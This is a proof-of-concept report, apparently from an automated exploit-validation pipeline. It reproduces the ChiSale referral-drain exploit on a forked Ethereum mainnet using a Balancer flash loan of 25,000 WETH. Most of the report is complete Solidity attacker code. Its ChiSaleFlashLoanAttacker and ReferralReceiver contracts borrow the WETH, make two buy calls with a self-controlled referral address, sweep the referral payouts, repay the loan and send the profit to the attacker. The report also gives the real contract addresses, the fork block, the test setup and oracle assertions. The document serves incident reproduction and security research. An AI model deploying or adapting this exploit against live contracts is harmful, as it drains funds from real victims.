# ChiSale Referral Drain via Balancer Flash‑Loan — PoC Report

## 1. Overview & Context

This Proof of Concept (PoC) reproduces, at a scaled‑down magnitude, the ChiSale referral logic exploit originally observed on Ethereum mainnet. In the incident, an adversary:

- Used a Balancer Vault flash‑loan of 25,000 WETH.
- Unwrapped WETH to ETH and executed two `ChiSale::buy(referral)` calls with a self‑controlled referral.
- Exploited the fact that the referral payout was calculated on `msg.value` even when the sale was effectively exhausted and almost all of `msg.value` was refunded as remainder.
- Drained the ChiSale contract’s pre‑existing ETH balance (~5.78 ETH) into the adversary’s referral/receiver contracts while repaying the flash‑loan principal.

In this validator environment, the QuickNode mainnet fork reports only **12 wei** of ETH held by ChiSale at the pre‑incident block, so the PoC scales the `msg.value` inputs down to a few wei. The directional semantics of the exploit are preserved:

- ChiSale starts with a positive ETH balance and ends with **less** ETH.
- The attacker EOA ends with **more** ETH than it started with.
- The profit and loss are ultimately sourced from ChiSale’s pre‑existing ETH balance via the referral payout path.

**Command to run the PoC** (from the Forge PoC project root):

```bash
cd forge_poc
RPC_URL="<RPC_URL>" forge test --via-ir -vvvvv --match-test testExploit
```

Where `RPC_URL` is derived from the validator environment using `chainid_rpc_map.json` and `.env` (the PoC validator injects it automatically during validation).

## 2. PoC Architecture & Key Contracts

### 2.1 Main Contracts and Roles

- **ChiSale** (`CHI_SALE`)
  - Address: `0x050163597D9905bA66400f7B3CA8f2ef23DF702D` (mainnet).
  - Vulnerable sale contract whose `buy(address referralAddress)` function pays a referral reward as a percentage of `msg.value`, even when no CHI remains to sell and most of `msg.value` is refunded.

- **ChiToken (CHI)** (`CHI_TOKEN`)
  - Address: `0x71E1f8E809Dc8911FCAC95043bC94929a36505A5`.
  - ERC‑20 token used in the sale; in the relevant pre‑state the ChiSale contract has effectively exhausted its CHI inventory.

- **Balancer Vault** (`BALANCER_VAULT`)
  - Address: `0xBA12222222228d8Ba445958a75a0704d566BF2C8`.
  - Lending source for the 25,000 WETH flash‑loan.

- **WETH** (`WETH`)
  - Address: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.
  - Wrapped ETH token used for the flash‑loan principal.

- **Attacker EOA**
  - Modeled as `vm.addr(1)` in the test (not the real incident EOA).
  - Funds and controls the adversary contract and receives final profit.

### 2.2 Adversary Contracts

**ReferralReceiver** — minimal ETH sink for referral payouts

```solidity
contract ReferralReceiver {
    address public immutable controller;

    constructor(address _controller) {
        controller = _controller;
    }

    // Accept ETH from ChiSale::buy referral payout (via send with 2300 gas)
    receive() external payable {}

    function sweepTo(address payable target) external {
        require(msg.sender == controller, "not controller");
        target.transfer(address(this).balance);
    }
}
```

- Receives ETH from ChiSale’s referral payouts.
- Later sweeps accumulated ETH back to the attacker contract.

**ChiSaleFlashLoanAttacker** — orchestrates flash‑loan and ChiSale buys

```solidity
contract ChiSaleFlashLoanAttacker is IBalancerFlashLoanRecipient {
    IBalancerVault public immutable vault;
    IWETH public immutable weth;
    IChiSale public immutable chiSale;
    address public immutable attackerEOA;

    ReferralReceiver public referralReceiver;

    uint256 public constant FLASH_AMOUNT = 25_000 ether;
    uint256 public constant FIRST_BUY_VALUE = 5; // wei
    uint256 public constant SECOND_BUY_VALUE = 5; // wei

    function execute(address payable _referralReceiver) external {
        require(msg.sender == attackerEOA, "only attacker");
        referralReceiver = ReferralReceiver(_referralReceiver);

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_AMOUNT;

        vault.flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata,
        bytes calldata
    ) external override {
        require(msg.sender == address(vault), "only vault");
        require(tokens.length == 1 && tokens[0] == address(weth), "token mismatch");

        uint256 amount = amounts[0];
        weth.withdraw(amount);

        chiSale.buy{value: FIRST_BUY_VALUE}(address(referralReceiver));
        chiSale.buy{value: SECOND_BUY_VALUE}(address(referralReceiver));

        referralReceiver.sweepTo(payable(address(this)));

        weth.deposit{value: amount}();
        require(IERC20(address(weth)).transfer(address(vault), amount), "repay failed");

        payable(attackerEOA).transfer(address(this).balance);
    }
}
```

**Key points:**

- `FLASH_AMOUNT` remains 25,000 ETH (as WETH), matching the incident’s flash‑loan size.
- `FIRST_BUY_VALUE` and `SECOND_BUY_VALUE` are reduced to 5 wei each, with comments explaining the scaling rationale:
  - ChiSale’s pre‑state on this fork is only 12 wei.
  - Two 5‑wei buys still produce non‑zero referral payouts but avoid the `OutOfFunds` revert seen with the original ~2k/18k ETH values.

## 3. Adversary Execution Flow

### 3.1 Environment Setup

In `ExploitTest.setUp()`:

```solidity
uint256 forkBlock = 21_254_757; // pre-incident block 21254757
string memory rpc = vm.envString("RPC_URL");
vm.createSelectFork(rpc, forkBlock);

attacker = vm.addr(1);
vm.deal(attacker, 1 ether);

vm.label(attacker, "attacker");
vm.label(CHI_SALE, "chi_sale");
vm.label(CHI_TOKEN, "chi_token");
vm.label(BALANCER_VAULT, "balancer_vault");
vm.label(WETH, "weth");

chiSaleBalanceBefore = CHI_SALE.balance;
attackerBalanceBefore = attacker.balance;

assertGt(chiSaleBalanceBefore, 0);
```

- Forks mainnet at the pre‑incident block (21254757) using the validator’s `RPC_URL`.
- Funds the attacker EOA with 1 ETH for gas.
- Records **ChiSale’s starting ETH balance** and **attacker’s starting ETH balance**.
- Enforces the **relaxed pre‑check**: ChiSale must start with a positive ETH balance.

### 3.2 Deployment and Configuration

```solidity
vm.startPrank(attacker);
attackerContract = new ChiSaleFlashLoanAttacker(
    IBalancerVault(BALANCER_VAULT),
    IWETH(WETH),
    IChiSale(CHI_SALE),
    attacker
);
referralReceiver = new ReferralReceiver(address(attackerContract));
vm.stopPrank();
```

- Attacker deploys the `ChiSaleFlashLoanAttacker` with Balancer Vault, WETH, and ChiSale addresses wired in.
- Attacker deploys `ReferralReceiver`, controlled by the attacker contract.

### 3.3 Exploit Steps (testExploit)

```solidity
function testExploit() public {
    vm.startPrank(attacker);
    attackerContract.execute(payable(address(referralReceiver)));
    vm.stopPrank();

    uint256 chiSaleBalanceAfter = CHI_SALE.balance;
    uint256 attackerBalanceAfter = attacker.balance;

    assertLt(chiSaleBalanceAfter, chiSaleBalanceBefore,
        "ChiSale ETH balance must strictly decrease during exploit");

    assertGt(attackerBalanceAfter, attackerBalanceBefore,
        "attacker must gain net ETH from exploit");

    uint256 chiSaleDelta = chiSaleBalanceBefore - chiSaleBalanceAfter;
    assertGe(chiSaleDelta, 1,
        "ChiSale must lose ETH during exploit");
}
```

**Step‑by‑step flow:**

1. **Flash‑loan acquisition**
   - `attackerContract.execute` calls `balancer_vault.flashLoan` for 25,000 WETH.
   - The vault transfers 25,000 WETH to `ChiSaleFlashLoanAttacker` and invokes `receiveFlashLoan`.

2. **Unwrap WETH and perform buys**
   - `weth.withdraw(FLASH_AMOUNT)` unwraps 25,000 WETH to 25,000 ETH in the attacker contract.
   - First `ChiSale::buy{value: 5}(referralReceiver)`:
     - No CHI is sold (sale exhausted), but a referral payout and remainder flows.
     - Referral payout goes to `ReferralReceiver`, remainder returned to attacker contract.
   - Second `ChiSale::buy{value: 5}(referralReceiver)`:
     - Same pattern: zero CHI sold, non‑zero referral payout to `ReferralReceiver`, remainder back to attacker contract.

3. **Collect referral rewards**
   - `ReferralReceiver.sweepTo(attackerContract)` forwards accumulated ETH to `ChiSaleFlashLoanAttacker`.

4. **Repay flash‑loan and realize profit**
   - Attacker contract re‑wraps exactly 25,000 ETH to WETH via `weth.deposit{value: amount}()`.
   - Transfers 25,000 WETH back to Balancer Vault, fully repaying principal.
   - Any remaining ETH in the attacker contract (sourced from ChiSale referral payouts) is forwarded to the attacker EOA.

5. **Post‑state checks**
   - `chiSaleBalanceAfter < chiSaleBalanceBefore` — ChiSale lost ETH.
   - `attackerBalanceAfter > attackerBalanceBefore` — attacker gained ETH.
   - `chiSaleDelta >= 1` — ChiSale lost at least 1 wei.

All of these assertions pass under the validator RPC.

## 4. Oracle Definitions and Checks

### 4.1 Oracle Variables

From `oracle_definition.json`:

- `attacker`: the adversary EOA (modeled as `vm.addr(1)` in the test).
- `chi_sale`: the vulnerable sale contract at `0x0501…702d`.
- `chi_token`: the CHI ERC‑20 token.
- `balancer_vault`: Balancer Vault used for flash‑loan.
- `weth_token`: WETH ERC‑20.
- `native_eth`: native ETH (balances observed via `.balance`).
- `referral_receiver`: the address that receives referral payouts (the `ReferralReceiver` contract in the PoC).

### 4.2 Pre‑check Oracle

**Definition (relaxed)**

- Description: ChiSale must start the PoC with a positive ETH balance so there is existing ETH to be drained via the referral payout bug.
- Assertion:

```solidity
uint256 chiSaleBalanceBefore = address(chi_sale).balance;
assertGt(chiSaleBalanceBefore, 0);
```

**Implementation in PoC**

```solidity
chiSaleBalanceBefore = CHI_SALE.balance;
...
assertGt(chiSaleBalanceBefore, 0);
```

### 4.3 Hard Constraint: ChiSale ETH Depletion (Directional)

**Definition**

- During the exploit transaction, ChiSale’s ETH balance must strictly decrease.
- Assertion:

```solidity
uint256 chiSaleBalanceAfter = address(chi_sale).balance;
assertLt(chiSaleBalanceAfter, chiSaleBalanceBefore,
    "ChiSale ETH balance must strictly decrease during exploit");
```

**Implementation in PoC**

```solidity
uint256 chiSaleBalanceAfter = CHI_SALE.balance;
assertLt(chiSaleBalanceAfter, chiSaleBalanceBefore,
    "ChiSale ETH balance must strictly decrease during exploit");
```

### 4.4 Soft Constraint: Attacker Native‑ETH Profit

**Definition (relaxed)**

- Attacker must end the transaction with strictly more ETH than before, achieving net native‑ETH profit.
- Assertion:

```solidity
uint256 attackerBalanceAfter = attacker.balance;
assertGt(attackerBalanceAfter, attackerBalanceBefore,
    "attacker must gain native ETH from exploit");
```

**Implementation in PoC**

```solidity
uint256 attackerBalanceAfter = attacker.balance;
assertGt(attackerBalanceAfter, attackerBalanceBefore,
    "attacker must gain net ETH from exploit");
```

### 4.5 Soft Constraint: ChiSale ETH Drain Magnitude (Directional)

**Definition (relaxed)**

- ChiSale must lose some ETH (at least 1 wei) during the exploit.
- Assertion:

```solidity
uint256 chiSaleDelta = chiSaleBalanceBefore - chiSaleBalanceAfter;
assertGt(chiSaleDelta, 0,
    "ChiSale must lose some ETH during exploit");
```

**Implementation in PoC**

```solidity
uint256 chiSaleDelta = chiSaleBalanceBefore - chiSaleBalanceAfter;
assertGe(chiSaleDelta, 1,
    "ChiSale must lose ETH during exploit");
```

All three oracles (pre‑check, hard, and soft constraints) are now **satisfiable** and **pass** under the validator’s QuickNode RPC.

## 5. Validation Result and Robustness

### 5.1 Validator Outcome

The PoC validator executed:

```bash
cd forge_poc
RPC_URL="<derived from chainid_rpc_map.json and .env>" \
forge test --via-ir -vvvvv > artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key observations from `forge-test.log`:

- `CounterTest` suite: all tests pass.
- `ExploitTest` suite:
  - `setUp()` forks mainnet at block 21254757, labels all key addresses, and confirms a positive ChiSale balance (12 wei).
  - `testExploit()` executes the full flash‑loan, double‑buy, sweep, repay, and profit transfer sequence **without revert**.
  - Post‑state assertions all pass.

Validator result JSON:

- File: `artifacts/poc/poc_validator/poc_validated_result.json`
- `overall_status`: `"Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed`: `true`
- All quality checks are marked `passed: true` with detailed reasons.

### 5.2 Robustness Considerations

- The PoC is tied to the validator’s `RPC_URL` and the specific QuickNode snapshot; state differences on another node could, in principle, affect balances.
- Scaling msg.value to 5 wei is explicitly documented as a modeling choice to remain consistent with the observed pre‑state while preserving exploit semantics.
- The flash‑loan size and protocol addresses remain those from the real incident, anchoring the PoC to the original environment.

## 6. Linking PoC Behavior to Root Cause

### 6.1 Exercising the Vulnerable Logic

The root cause report describes:

- A **referral payout bug** in `ChiSale::buy(address referralAddress)`:
  - Referral reward is computed as a fixed percentage of `msg.value`.
  - When ChiSale is out of CHI, `tokensToBuy` is zero and most of `msg.value` is refunded, yet the referral reward is still based on the full `msg.value`.
  - This allows a caller to send large `msg.value`, receive most of it back, and still extract referral rewards funded by ChiSale’s existing ETH.

In the PoC:

- `ChiSaleFlashLoanAttacker.receiveFlashLoan` performs **two** buys with `referralReceiver` as the referral:
  - `chiSale.buy{value: FIRST_BUY_VALUE}(referralReceiver)`
  - `chiSale.buy{value: SECOND_BUY_VALUE}(referralReceiver)`
- Because CHI supply is exhausted at this block, both buys:
  - Transfer **zero** CHI.
  - Still emit `LogChiPurchase` events.
  - Send referral payouts to `ReferralReceiver` and remainders back to the attacker contract.
- `ReferralReceiver.sweepTo` then aggregates the referral ETH back to the attacker contract, which forwards remaining ETH to the attacker EOA after repaying the flash‑loan.

This reproduces the **structure** of the vulnerability: ETH is drained from ChiSale via referral payouts triggered by `msg.value`, independent of actual CHI sold.

### 6.2 Demonstrating the Exploit Predicate (ACT Framing)

From `root_cause.json`, the exploit predicate is a **profit‑type** predicate:

- Reference asset: ETH.
- Victim: ChiSale contract at `0x0501…702d`.
- Adversary: attacker EOA.
- Predicate:
  - Victim loses ETH.
  - Adversary gains ETH.

In the PoC:

- **A (Adversary‑crafted action)**
  - Attacker submits a Balancer `flashLoan` transaction that triggers the exploit (`testExploit()` in the PoC).

- **C (Contract interactions)**
  - Balancer Vault lends WETH.
  - WETH unwraps to ETH.
  - Two `ChiSale::buy(referral)` calls with a self‑controlled referral.
  - Referral payouts and remainders route ETH through the attacker’s helper contracts.
  - Flash‑loan principal is fully repaid.

- **T (Terminal condition / predicate)**
  - `chiSaleBalanceAfter < chiSaleBalanceBefore`: **victim depletion**.
  - `attackerBalanceAfter > attackerBalanceBefore`: **attacker profit**.
  - `chiSaleDelta >= 1`: a strictly positive ETH loss from the victim.

The passed oracles confirm that, even with scaled‑down amounts, the ACT predicate remains satisfied: 

- The victim (ChiSale) loses ETH.
- The attacker gains ETH.
- The flow of funds follows the referral payout bug path identified as the root cause.

---

This PoC is therefore validated as a **passing**, self‑contained reproduction of the ChiSale referral drain exploit under the validator’s mainnet fork, with all relaxed oracles and quality criteria satisfied.
